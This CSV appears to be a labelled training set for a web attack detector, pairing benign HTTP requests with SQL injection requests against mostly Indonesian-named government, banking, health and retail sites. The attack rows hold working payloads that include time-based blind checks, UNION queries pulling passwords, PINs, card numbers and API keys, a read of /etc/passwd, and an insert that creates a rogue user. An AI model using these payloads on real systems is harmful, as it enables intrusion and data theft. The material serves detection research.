payload,label
GET http://monitor.jaringan-fiber.id/node?node_id=N-0441&region=jatim&status=active,benign
"GET http://backend.lelang-online.id/item?bid_id=BID-2241' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND SLEEP(2)--",attack
POST http://api.absensi-sekolah.id/attendance?student_id=S8812&date=2024-07-01&status=hadir,benign
"GET http://portal.dinas-kesehatan.id/puskesmas?id=PKM-012' AND CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)>0--",attack
GET http://app.budgetplanner.id/expense?user=U4421&category=food&month=6,benign
"GET http://api.simpedes-bri.id/account?acc_no=009801234567890' UNION SELECT NULL,NULL,NULL,pin,NULL FROM account_data--",attack
GET http://dashboard.retailchain.id/store?store_id=ST-0091&region=east-java&report=daily,benign
"GET http://backend.agen-tiket.id/booking?ref=BK-7721' AND IF(2>1,BENCHMARK(2000000,SHA1(1)),0)--",attack
POST http://api.teleconsult.id/session?doctor_id=D882&patient_id=P441&type=video,benign
"GET http://portal.pengadaan-barang.id/tender?tid=TND-2024-0181' AND (SELECT IFNULL(CAST(username AS CHAR),0x20) FROM admin LIMIT 1)='admin'--",attack
GET http://monitor.cuacajatim.id/station?station_id=BWX&param=rainfall&date=2024-07-01,benign
"GET http://erp.pabrikrokok.id/batch?batch_id=BCH-9921';INSERT INTO users(username,password) VALUES(0x6861636b6572,0x70617373)--",attack
GET http://api.alumni-its.id/member?year=2010&major=informatika&city=surabaya,benign
"GET http:/backend.sistemlomba.id/participant?pid=P2291' UNION SELECT NULL,CONCAT(0x7e,table_name,0x7e),NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 5--",attack
POST http://api.simpeg-pemkab.id/employee?nip=199004012020011001&unit=dinas-pendidikan,benign
"GET http://shop.gadgetstore.id/review?product_id=GDG-441' AND LPAD(user(),1,1)>'a'--",attack
GET http://dashboard.tppi-pertamina.id/refinery?unit=CDU-3&date=2024-06-30&param=throughput,benign
"GET http://api.sistem-ktp.id/penduduk?nik=3573012345670001' AND (SELECT HEX(database()))>0--",attack
GET http://portal.simda-kemendagri.id/anggaran?satker=dinas-pu&tahun=2024&triwulan=2,benign
"GET http://backend.forum-programmer.id/thread?tid=8812' AND (SELECT SUBSTR(password,1,5) FROM users WHERE id=1)='pass'--",attack
POST http://api.ewallet-gopay-sim.id/topup?user_id=U9921&amount=100000&source=bca,benign
"GET http://cms.galerisenibatik.id/artwork?id=ART-221' UNION SELECT NULL,NULL,load_file('/etc/passwd')--",attack
GET http://monitor.bendunganbrantas.id/gate?gate_id=G-07&elevation=2024-07-01&status=open,benign
"GET http://api.siakad-umm.ac.id/course?kode=IF601' AND EXPORT_SET(1=1,SLEEP(3),1,1,1)--",attack
GET http://app.rekrutmen-online.id/vacancy?job_id=JOB-2291&location=malang&type=fulltime,benign
"GET http://portal.bapenda-kota.id/pajak?objek_id=PBB-2024-0991' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",attack
POST http://api.siadpa-pengadilan.id/case?case_no=PDT-2024-0112&type=perdata&status=active,benign
"GET http://backend.tikettrain.id/schedule?train_id=KA-121' UNION ALL SELECT NULL,CONCAT(username,0x7e,password),NULL FROM admin_users--",attack
GET http://monitor.airnav-surabaya.id/flight?callsign=GIA401&route=CGK-SUB&date=2024-07-01,benign
"GET http://api.simpeg-bkn.id/pegawai?nip=198802012015011001' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='pegawai')>5 AND SLEEP(2)--",attack
POST http://app.clinic-management.id/prescription?rx_id=RX-8812&drug=paracetamol&dose=500mg,benign
"GET http://portal.kpu-daerah.id/dpt?nik=3573099912340001' AND IF(1=1,(SELECT SLEEP(5)),0)--",attack
GET http://dashboard.wastewater-treatment.id/tank?tank_id=TK-03&param=bod&date=2024-06-30,benign
"GET http://api.marketplace-umkm.id/seller?sid=SLR-4421' AND (SELECT 1 FROM(SELECT(SLEEP(4)))a)--",attack
GET http://portal.simpad-kemenhub.id/vessel?mmsi=525003001&route=TJP-TBK&date=2024-07-01,benign
"GET http://backend.kotak-pos.id/parcel?tracking_id=POS2024071200001' UNION SELECT NULL,CONCAT(sender_name,0x3a,address,0x3a,phone),NULL FROM parcel_data--",attack
POST http://api.perizinan-oss.id/license?nib=1234567890123&type=umk&status=active,benign
"GET http://admin.portaltender.id/vendor?vid=VND-8812' AND CHAR(49)=CHAR(49) UNION SELECT NULL,NULL,NULL,schema_name FROM information_schema.schemata--",attack
GET http://monitor.pltu-paiton.id/boiler?unit=B4&param=steam_pressure&shift=day,benign
"GET http://api.sisco-kemenkeu.id/satker?kode=066.01.0001' AND MAKE_SET(1=1,(SELECT SLEEP(3)))--",attack
GET http://portal.dishub-kotamalang.id/angkutan?trayek=ADL&status=active&date=2024-07-01,benign
"GET http://backend.agensiiklan.id/campaign?cid=CAM-9921' UNION SELECT NULL,NULL,NULL,NULL,CONCAT(api_key,0x3a,secret) FROM integration_keys--",attack
POST http://app.sipa-pertanian.id/lahan?petani_id=PTN-2291&komoditas=padi&luas=2.5ha,benign
"GET http://crm.konsultan-hukum.id/client?cid=CLT-441' AND ASCII(MID((SELECT password FROM users LIMIT 1),2,1))>100--",attack
GET http://monitor.sutet-pln.id/tower?tower_id=TW-0821&region=malang&param=tension,benign
"GET http://api.simponi-kemendikbud.id/sekolah?npsn=20533001' AND (SELECT CASE WHEN SUBSTR(database(),1,1)='s' THEN SLEEP(4) ELSE 0 END)--",attack
GET http://portal.sirup-kemenpan.id/jabatan?kode_jabatan=JP-0021&unit=sekretariat,benign
"GET http://backend.portal-investasi.id/project?pid=PRJ-8812' AND UPDATEXML(9999,CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) FROM admin LIMIT 1)),1)--",attack
POST http://api.sipd-kemendagri.id/apbd?kode_daerah=3573&tahun=2024&jenis=pendapatan,benign
"GET http://shop.sepatulokal.id/product?sku=SP-441' UNION SELECT NULL,NULL,NULL,card_number,NULL FROM saved_cards--",attack
GET http://dashboard.irigasi-brantas.id/pintu-air?id=PA-12&tanggal=2024-07-01&status=buka,benign
"GET http://api.simaset-pemkot.id/aset?kode=AT-2024-0221' AND ORD(MID(VERSION(),1,1))>53--",attack
GET http://portal.rs-dr-saiful-anwar.id/poli?poli=penyakit-dalam&kuota=2024-07-15,benign
"GET http://backend.lms-universitasbrawijaya.id/course?cid=CS601' RLIKE SLEEP(5)--",attack
